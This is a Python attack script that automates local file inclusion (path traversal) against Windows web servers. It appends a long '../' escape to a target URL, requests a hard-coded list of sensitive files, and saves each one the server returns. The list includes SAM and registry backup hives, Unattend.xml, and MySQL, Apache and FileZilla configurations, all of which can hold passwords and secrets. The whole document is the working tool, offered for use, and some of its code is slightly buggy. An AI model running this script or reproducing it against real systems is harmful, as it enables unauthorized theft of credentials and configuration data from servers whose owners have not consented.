#Script made by Bibikski
#Website: https://www.bibikski.com
#Twitter: https://www.twitter.com/bibikdev
#Discord: Bibikski#3172
#-----------------------------------------------------------------------------------------------------------
#Local File Inclusion for Windows
#This script is made to obtain files through Local File Inclusion. It makes a request to the webserver and
#if the server responds with a code 200, it will download the page as a text file. These are all file
#that can disclose information such as, passwords, configs, databases, only if the webserver has access to
# the disclosed location. If the files do not contain the content but still are being created, put the outputed
#lfi in burp to see the content.
#Thank you for using this tool! ~ Bibikski
#-----------------------------------------------------------------------------------------------------------

import requests
from time import sleep
import os

#Provide the script the url to preform the Local File Inclusion
url = ""

#This piece will escape the current location and move back
de="/../../../../../../../../../../../../../"

#Set the cookie if that is required
c = ""

#If you know that you can be blocked from too many request, provide a time to wait per request (seconds)

time = 0

#If you are getting errors getting the file, set custom headers to see if you obtain the file.

#These file locations are not mine. I copied them from this link
#https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
#Thank you to this blog for providing these locations!

loc=["/Users/Administrator/NTUser.dat", "/Documents and Settings/Administrator/NTUser.dat", "/apache/logs/access.log",
"/apache/logs/error.log", "/apache/php/php.ini", "/boot.ini", "/inetpub/wwwroot/global.asa",
"/MySQL/data/hostname.err", "/MySQL/data/mysql.err", "/MySQL/data/mysql.log", "/MySQL/my.cnf", "/MySQL/my.ini",
"/php4/php.ini", "/php5/php.ini", "/php/php.ini", "/Program Files/Apache Group/Apache2/conf/httpd.conf", 
"/Program Files/Apache Group/Apache/conf/httpd.conf", "/Program Files/Apache Group/Apache/logs/access.log",
"/Program Files/Apache Group/Apache/logs/error.log", "/Program Files/FileZilla Server/FileZilla Server.xml",
"/Program Files/MySQL/data/hostname.err", "/Program Files/MySQL/data/mysql-bin.log",
"/Program Files/MySQL/data/mysql.err", "/Program Files/MySQL/data/mysql.log", "/Program Files/MySQL/my.ini",
"/Program Files/MySQL/my.cnf", "/Program Files/MySQL/MySQL Server 5.0/data/hostname.err",
"/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log", "/Program Files/MySQL/MySQL Server 5.0/data/mysql.err",
"/Program Files/MySQL/MySQL Server 5.0/data/mysql.log", "/Program Files/MySQL/MySQL Server 5.0/my.cnf",
"/Program Files/MySQL/MySQL Server 5.0/my.ini", "/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf",
"/Program Files (x86)/Apache Group/Apache/conf/httpd.conf", "/Program Files (x86)/Apache Group/Apache/conf/access.log",
"/Program Files (x86)/Apache Group/Apache/conf/error.log", "/Program Files (x86)/FileZilla Server/FileZilla Server.xml",
"/Program Files (x86)/xampp/apache/conf/httpd.conf", "/WINDOWS/php.ini", "/WINDOWS/Repair/SAM", "/Windows/repair/system",
"/Windows/repair/security", "/WINDOWS/System32/drivers/etc/hosts", "/Windows/win.ini", "/WINNT/php.ini",
"/WINNT/win.ini", "/xampp/apache/bin/php.ini", "/xampp/apache/logs/access.log", "/xampp/apache/logs/error.log",
"/Windows/Panther/Unattend/Unattended.xml", "/Windows/Panther/Unattended.xml", "/Windows/debug/NetSetup.log",
"/Windows/system32/config/AppEvent.Evt", "/Windows/system32/config/SecEvent.Evt", "/Windows/system32/config/default.sav",
"/Windows/system32/config/security.sav", "/Windows/system32/config/software.sav",
"/Windows/system32/config/system.sav", "/Windows/system32/config/regback/default", "/Windows/system32/config/regback/sam",
"/Windows/system32/config/regback/security", "/Windows/system32/config/regback/system",
"/Windows/system32/config/regback/software", "/Program Files/MySQL/MySQL Server 5.1/my.ini",
"Windows/System32/inetsrv/config/schema/ASPNET_schema.xml", "/Windows/System32/inetsrv/config/applicationHost.config"]

dname = url[7:]
if(os.path.exists(dname)):
    dname + "1"
    os.mkdir(dname)
    os.chdir(dname)
if(os.path.exists(dname) == False):
    os.mkdir(dname)
    os.chdir(dname)

o = open("output.txt", "w+")
o.write("If output files are displaying errors, I have included the LFI that worked for manual testing in burp.")
o.close()

for location in loc:
    headers = {}
    if(c != ""):
        cookies = {'Cookies':c}
        r = requests.get(url+de+location, cookie = cookies, headers = headers)

    if(c == ""):
        r = requests.get(url+de+location, headers = headers)
    resp = r.status_code
    if(resp == 200):
        s = location.replace("/", "-")
        title = s[1:]
        f = open(title + ".txt", "w+")
        p = r.content
        f.write(str(p))
        f.close()
        o = open("output.txt", "w+")
        o.write("\n" + de+location + "   Code: " + str(resp))
        o.close()
    sleep(time)    
print("Thank you for using! ~Bibikski")